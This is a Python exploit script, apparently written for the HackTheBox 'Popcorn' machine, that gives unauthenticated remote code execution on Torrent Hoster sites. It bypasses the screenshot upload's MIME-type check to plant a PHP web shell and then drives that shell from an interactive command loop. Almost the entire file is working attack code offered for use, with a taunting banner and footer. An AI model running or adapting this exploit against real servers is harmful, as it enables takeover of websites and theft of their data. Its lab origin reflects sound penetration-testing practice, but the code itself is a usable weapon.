#!/usr/bin/env python

"""

Torrent Hoster - Unauthenticated RCE (tested on Popcorn in HTB)

Exploits the Upload Screenshot for torrents feature -- While exploiting the file uploading feature
in screenshots section found out that an unauthenticated attacker can upload screenshots as well. Since,
anyone can bypass the file-type check by changing the mime-type (to image/jpeg of the following).

  if (($_FILES["file"]["type"] == "image/gif")
  || ($_FILES["file"]["type"] == "image/jpeg")
  || ($_FILES["file"]["type"] == "image/jpg")
  || ($_FILES["file"]["type"] == "image/png")

No extension check on the file results in upload of a .php file which then results in Remote Command 
Execution. Wrote a POC based on that; not something really big! 

You'll require bs4 & requests from pypi to make the exploit work!
	>>> pip instal bs4 
	>>> pip instal requests

"""

import requests
from bs4 import BeautifulSoup
import argparse
import sys
from time import sleep

BANNER = r"""      _____                    _____          
     /\    \                  /\    \         
    /::\    \                /::\____\        
    \:::\    \              /:::/    /        
     \:::\    \            /:::/    /         
      \:::\    \          /:::/    /          
       \:::\    \        /:::/____/           
       /::::\    \      /::::\    \           
      /::::::\    \    /::::::\    \   _____  
     /:::/\:::\    \  /:::/\:::\    \ /\    \ 
    /:::/  \:::\____\/:::/  \:::\    /::\____\
   /:::/    \::/    /\::/    \:::\  /:::/    /
  /:::/    / \/____/  \/____/ \:::\/:::/    / 
 /:::/    /                    \::::::/    /  
/:::/    /                      \::::/    /   
\::/    /                       /:::/    /    
 \/____/     :                  /:::/    /     
                              /:::/    /      
                             /:::/    /       
                             \::/    /        
                              \/____/   @qiqi
"""

FOOTER 	= """
[&] Thanks for exploiting me senpai ^_^
"""
proxies = None


def cleanURL(url):
	url = url.replace("index.php", "")
	if url[::-1][0] != "/": return(url + "/")
	else: return(url)

def addSuspense(delay=0.5):
	for x in range(5):	print("."); sleep(delay)

def parseTorrents(url):
	print("[#] Browsing torrents on the website")
	request = requests.get(url + "index.php?mode=directory", proxies=proxies).text
	soup = BeautifulSoup(request, 'html.parser').find_all('td', {'align': 'left', 'width': '300'})

	if len(soup) == 0:
		exit("[!] Dang; Better luck next time!\n```\nNo torrents found on the website!\n```")

	torrents = []

	print("[~] Found the following torrents with IDs:\n```")
	for elements in soup[::-1]: # Reverse The List -- Select the last possible torrent to overwrite4
		# print(elements)
		tId = elements.a['href'].split("=")[::-1][0]
		path = url + "upload_file.php?mode=upload&id=" + tId
		print(tId,path)
		torrents.append(path)

	print("```"+torrents[1])
	print("\n[$] Selecting the last possible torrent({(torrents[1].split(\"=\")[::-1][0])}) to upload screenshot to!")
	return(torrents[1])

def uploadShell(path):
	print("[#] Uploading WebShell"+path)
	request = requests.post(path,
		headers = {
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", 
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
			"Accept-Language": "en-US,en;q=0.5", 
			"Accept-Encoding": "gzip, deflate", 
			"Content-Type": "multipart/form-data; boundary=---------------------------557387531096085749533931648",
			"Connection": "close", 
		}, proxies=proxies, 
		data = "-----------------------------557387531096085749533931648\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\nsystem($_GET['c']);\n\n?>\n\r\n-----------------------------557387531096085749533931648\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit Screenshot\r\n-----------------------------557387531096085749533931648--\r\n"
	).text
	return (request)

def accessShell(url, path):
	tId = path.split("=")[::-1][0]
	print("\n[$] Whoa, we got a shell dude! Spawning Console!!!"+tId)

	command = ""
	shellPath = url + "/upload/" + tId +".php?c=" + command
	print("[&] Shell Uploaded: " + shellPath)
	addSuspense()

	while True:
		try:
			command = input("$ ")
			print("执行的命令："+shellPath+command)
			resp = requests.get(shellPath + command)
			print(resp.text)

		except KeyboardInterrupt:
			exit("\n[@] Okay boomer!" + FOOTER)

def main():
	print(BANNER)
	parser = argparse.ArgumentParser(description="Uploads WebShell on *Add Screenshot* feature as an unauthenticated user.", usage='\rUsage: python '+ sys.argv[0] + ' --url=http://host/torrentHoster/')
	parser._optionals.title = "Basic Help"

	basicFuncs = parser.add_argument_group('Actions')
	basicFuncs.add_argument('--burp', 	action="store", 	dest="burp", 	default=False, 	help="Prints Everything -- Poor Man's Debugging")
	basicFuncs.add_argument('--url', 	action="store", 	dest="url", 	default=False, 	help='URL of Torrent Hoster hosted somewhere')
	args = parser.parse_args()
	global proxies
	if args.burp:
		proxies = {
			'http': 'http://127.0.0.1:8080',
			'https': 'http://127.0.0.1:8080'
		}
	if args.url:
		args.url = cleanURL(args.url)
		path = parseTorrents(args.url)

		if path != None:
			if "Upload Completed." in uploadShell(path):
				accessShell(args.url, path)

			else:
				print("[!] Dang; Better luck next time!")

		else:
			print("[!] Dang; Better luck next time!\n```\nHost({}) isn't vulnerable!\n```".format(args.url))

	else:
		parser.print_help()

	print(FOOTER)

if __name__ == '__main__':
	main()
